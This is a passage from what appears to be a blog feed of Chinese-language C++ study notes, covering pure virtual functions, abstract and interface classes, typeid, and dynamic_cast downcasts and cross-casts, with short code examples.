        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>概念性的东西</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>像animal类，派生了dog和cat。<br>animal中有一个函数move，只不过肯定是在派生类里面实现才有意义，毕竟不同动物类肯定有区别。<br><code>virtual void move() = 0;</code></p><p><strong>注：virtual写在返回值前后问题不大看个人习惯。毕竟他又不能作为返回值，写前面只是更加显眼一点</strong></p><p>正常情况的虚函数<code>virtual void move()&#123;&#125;</code>或者<code>virtual void move();</code>，对于后者没有定义的话编译器一般都不会通过。<br>在加上<code>=0;</code>之后就是我们所说的纯虚函数。</p><p>为什么要用纯虚函数，是因为基类虽然用不到，但是派生类难免会用到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">dog d1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/abstractclass/000.png" class=""><p>像这种声明了，但是没有定义，实例化内的时候就会报错。</p><p>而有的时候我们没打算给他做什么定义。也不想弄个空定义，就做成纯虚函数是最合适的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">dog d1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p><strong>广泛的定义就比较糙，拥有纯虚函数的类被称为抽象类，因为该类的函数没有任何实现。</strong><br>不过也是因为没有任何实现，所有不能实例化抽象类，只能使用抽象类的指针和引用作为返回或者参数。</p><ol><li>抽象类的构造函数因为不能实际使用，所以一般推荐把抽象类的构造函数定义为<code>protected</code></li><li>抽象类的派生类如果没有定义纯虚函数，则这个派生类也还是抽象类</li></ol><img src="/2022/07/04/abstractclass/001.png" class=""><p>代码是上面的，可以看到抽象类无法实例化。</p><p>最多就是指针或者引用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dog d1;</span><br><span class="line">animal *ami = &amp;d1;</span><br></pre></td></tr></table></figure><p>不过既然无法实例化抽象类了，他就建议你把抽象类的构造函数放到受保护区域。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>前提构造函数有定义，没啥内容感觉也没必要这样写，反正终归是编程建议，而不是语法规范。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>动物有飞禽走兽的说法，狗狗自然是地上跑的，所以没有对fly的定义，但是终归是继承的animal，派生类没有定义继承的顺序函数，也将是一个抽象类。</p><p>也就是dog也没法实例化了。</p><img src="/2022/07/04/abstractclass/002.png" class=""><hr><h2 id="接口类"><a href="#接口类" class="headerlink" title="接口类"></a>接口类</h2><p>指类中大部分都是定义为纯虚函数的类被称为接口类。<br>不过估计c#和java会比较多，c++毕竟是面向对象和面向过程结合体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个概念比较直接哈哈</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>搞项目应该才用得到</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typeid</title>
      <link href="/2022/07/04/typeid/"/>
      <url>/2022/07/04/typeid/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当指向类的指针转换好几次的时候，人为看过去雀食很累了，就可以用<code>typeid</code>去看这个变量的类型。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(a).<span class="built_in">name</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最直接的情况</p><img src="/2022/07/04/typeid/000.png" class=""><p>但是有个别变量的处理不是很好，比如long long</p><img src="/2022/07/04/typeid/001.png" class=""><p>他显示的是<code>__int64</code></p><p>还有的就是不是所有的编译器都默认打开这个功能。</p><hr><h2 id="检测多态类型"><a href="#检测多态类型" class="headerlink" title="检测多态类型"></a>检测多态类型</h2><h3 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> : <span class="keyword">public</span> father&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span>:<span class="keyword">public</span> son&#123;&#125;;</span><br></pre></td></tr></table></figure><p>设计三个类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">father *fa = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">fa = <span class="keyword">new</span> <span class="built_in">grandson</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/002.png" class=""><p>看到返回的是类的指针类型，而不是正常的类型。<br>因为需要解除引用，转出类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">father *fa = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">fa = <span class="keyword">new</span> <span class="built_in">grandson</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(*fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/003.png" class=""><p>到此还不是最理想的类型显示。他显示的还是他最早声明的类型，但是我们new过之后，应该让他显示我们new之后的类型。</p><p>原因是类不支持多态，类型不会动态转换，所以往基类里面加个虚函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> : <span class="keyword">public</span> father&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span>:<span class="keyword">public</span> son&#123;&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/004.png" class=""><p>再次打印看到结果是我们最后一次new的类型了。</p><p><strong>注意要用星号解引用，不然还是它定义的类型</strong></p><hr><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father &amp;fa = s1;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/005.png" class=""><p>可以看到直接打印出了s1的类型。</p><p>并且修改成grandson也是没问题</p><img src="/2022/07/04/typeid/006.png" class=""><p>首先引用是个弱化的指针，它不需要像指针那样还要单独解引用。</p><hr><h2 id="无聊的比较"><a href="#无聊的比较" class="headerlink" title="无聊的比较"></a>无聊的比较</h2><p>估计会好奇typeid返回的是不是字符串，如果是也就能拿来和字符串比较。</p><img src="/2022/07/04/typeid/007.png" class=""><p>这样肯定是不合法的。</p><img src="/2022/07/04/typeid/008.png" class=""><p>可以看到显然typeid的返回值不会是const char。</p><p>那么最简单的就是两个typeid互相比较</p><img src="/2022/07/04/typeid/009.png" class=""><p>比较类型当然少不了类。</p><img src="/2022/07/04/typeid/010.png" class=""><img src="/2022/07/04/typeid/011.png" class=""><p>虽然name是const char*，但是和字符串比较没有结果，而且也不合适，还是直接调用现场的好了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>typeid没啥问题，凑合用。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数dynamic_cast</title>
      <link href="/2022/07/03/purevirtualfunction/"/>
      <url>/2022/07/03/purevirtualfunction/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>dynamic_cast&lt;type&gt;()<br>动态转换只支持方法多态类型的指针，如果转换成功返回指针，失败则返回nullptr<br>同样分为两种情况：</p><ol><li>向下转换 downcast</li><li>跨类转换 crosscast</li></ol><p><strong>注：不要随便转换this指针</strong></p><span id="more"></span><p>还有一点，当dynamic_cast用于转换引用时，转换失败会抛出异常，所以一般不推荐转换引用</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span> :<span class="keyword">public</span> wolf, <span class="keyword">public</span> pople&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还是之前的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line"></span><br><span class="line">son *s2 = <span class="built_in">static_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><p>正常情况下我们知道静态转换可以这么操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line">fh = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">son *s2 = <span class="built_in">static_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><p>虽然强转，但是毕竟父类和子类结构不一样，指针的时候不是很理想。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><img src="/2022/07/03/purevirtualfunction/000.png" class=""><p>用动态转换的时候他要求类是一个多态类，那么在基类中加一个虚函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后编译就能通过了，对此是否完成转换，前面提到过转换成功返回指针，没成功返回nullptr。</p><img src="/2022/07/03/purevirtualfunction/001.png" class=""><p>显然是失败了，因为fh指针我们重新new了一个father类型。导致和son不同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line"><span class="comment">//fh = new father();</span></span><br><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s2 == <span class="literal">nullptr</span>) std::cout &lt;&lt; <span class="string">&quot;error!\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;success!\n&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/purevirtualfunction/002.png" class=""><p>当我们注释掉重新new的那句，fh仍然指向一个son类型的，那么它的指针信息就会和son有关。</p><hr><h2 id="不要过度依赖"><a href="#不要过度依赖" class="headerlink" title="不要过度依赖"></a>不要过度依赖</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">daughter</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后无脑为了转换基类指针，然后调用各自的move</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> sp = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line"><span class="keyword">auto</span> du = <span class="built_in">dynamic_cast</span>&lt;daughter *&gt;(fh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sp != <span class="literal">nullptr</span>) sp-&gt;<span class="built_in">Move</span>();</span><br><span class="line"><span class="keyword">if</span> (du != <span class="literal">nullptr</span>) du-&gt;<span class="built_in">Move</span>();</span><br></pre></td></tr></table></figure><p>这些全是下饭操作，这其实没有必要去做什么动态转换，直接在基类里面加一个虚函数，子类重写一下直接调用是最快的。</p><p><strong>不可取</strong></p><hr><h2 id="不要乱玩this指针"><a href="#不要乱玩this指针" class="headerlink" title="不要乱玩this指针"></a>不要乱玩this指针</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dynamic_cast</span>&lt;father*&gt;(<span class="keyword">this</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设基类中有虚函数，它对this指针进行了一些操作，那么当派生类继承下来的时候，就全是在派生类上动手脚了，虽然语法规定没有限制不能转换this指针，但是不推荐这么操作，大多情况下人都把握不住。</p><hr><h2 id="强转指针和引用"><a href="#强转指针和引用" class="headerlink" title="强转指针和引用"></a>强转指针和引用</h2><p>之前说为了保证数据的完整，建议都是通过指针或者引用转换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line">father &amp;fh1 = (father &amp;)s1;</span><br></pre></td></tr></table></figure><p>这两种强转都是没有什么问题的，引用本身就是弱化的指针。</p><p>而当使用<code>dynamic_cast</code>的时候，也是前面提到过的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line">daughter &amp;au = <span class="built_in">dynamic_cast</span>&lt;daughter &amp;&gt;(s1);</span><br></pre></td></tr></table></figure><p>当<code>dynamic_cast</code>去做引用的转换时，他如果出错了不是返回nullptr而是抛出异常。</p><img src="/2022/07/03/purevirtualfunction/003.png" class=""><p>在底层上，指针存在空指针，而引用没有空引用的说法。</p><hr><h2 id="跨类转换"><a href="#跨类转换" class="headerlink" title="跨类转换"></a>跨类转换</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//if(dynamic_cast&lt;father*&gt;(this))</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">daughter</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span> :<span class="keyword">public</span> wolf, <span class="keyword">public</span> Box&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>构建一个新类box，他跟father之类的毫无关系，但是他被werewolf继承。</p><p>那么这个类还适合转换吗？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">werewolf wf;</span><br><span class="line">father *fa = (father *)&amp;wf;</span><br></pre></td></tr></table></figure><p>因为存在多重继承，向下继承的适合自己推敲有点麻烦，就看看动态能不能直接完成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> p = <span class="built_in">dynamic_cast</span>&lt;Box *&gt;(fa);</span><br></pre></td></tr></table></figure><p>显然是可以的。</p><img src="/2022/07/03/purevirtualfunction/004.png" class=""><p>他是成功返回了一个指针，而不是nullptr。</p><p>那么在关联上</p><img src="/2022/07/03/purevirtualfunction/005.png" class=""><p>father和box是没有直接关系的，但是werewolf继承了这两个，因此包含了他俩的属性，所以werewolf可以主动转换成father和box类型。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>迷迷糊糊。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象多态?</title>
      <link href="/2022/07/03/Polymorphic2/"/>
      <url>/2022/07/03/Polymorphic2/</url>
      
